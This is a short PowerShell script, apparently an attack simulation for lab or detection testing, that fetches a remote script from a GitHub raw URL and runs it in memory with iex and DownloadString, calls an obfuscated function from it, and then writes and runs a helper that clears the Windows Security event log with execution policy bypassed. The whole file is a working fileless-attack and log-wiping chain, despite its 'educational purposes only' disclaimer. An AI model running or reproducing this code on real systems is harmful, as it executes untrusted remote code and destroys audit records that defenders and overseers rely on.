# Disclaimer: This script is for educational purposes only and must be executed in a secure, isolated lab environment.
# Do not execute it in production or on-premises environments under any circumstances.

# Define the URL where the external script is hosted
# This example URL points to a remote script. Make sure you understand the implications of downloading and executing remote scripts.
$url = "https://raw.githubusercontent.com/norsemen-local/Malicious-Actions/refs/heads/main/Case%201%20-%20Fileless%20Attack/inject.ps1"

# Download and execute the external script
# The "iex" command evaluates the downloaded script's content as PowerShell code.
# The "New-Object net.webclient" is used to fetch the script from the URL.
iex ((New-Object net.webclient).DownloadString($url))

# Invoke a function or command from the downloaded script
# The command `Invoke-HGFXNPCQTZ` is defined in the external script. 
Invoke-HGFXNPCQTZ

# Define the content of the new PowerShell script `delete_logs.ps1`
$deleteLogsContent = @'
# This script is for educational purposes only.
# It clears security logs from the Windows Event Viewer to simulate log management scenarios in a controlled environment.

try {
    # Attempt to clear the Security event logs using wevtutil. This action requires administrative privileges.
    wevtutil cl Security
    # If successful, print a confirmation message.
    Write-Output "Security logs have been cleared using wevtutil."
} catch {
    # If an error occurs (e.g., insufficient permissions), display an error message.
    Write-Output "Failed to clear security logs. Ensure you have the required permissions."
}
'@

# Specify the file path where the `delete_logs.ps1` script will be created
$deleteLogsFilePath = "delete_logs.ps1"

# Write the content defined in `$deleteLogsContent` to the file `delete_logs.ps1`
Set-Content -Path $deleteLogsFilePath -Value $deleteLogsContent

# Execute the newly created script `delete_logs.ps1`
# The `PowerShell` command with `-ExecutionPolicy Bypass` ensures the script runs even if the system's execution policy would typically block it.
Write-Output "Executing delete_logs.ps1..."
PowerShell -ExecutionPolicy Bypass -File $deleteLogsFilePath
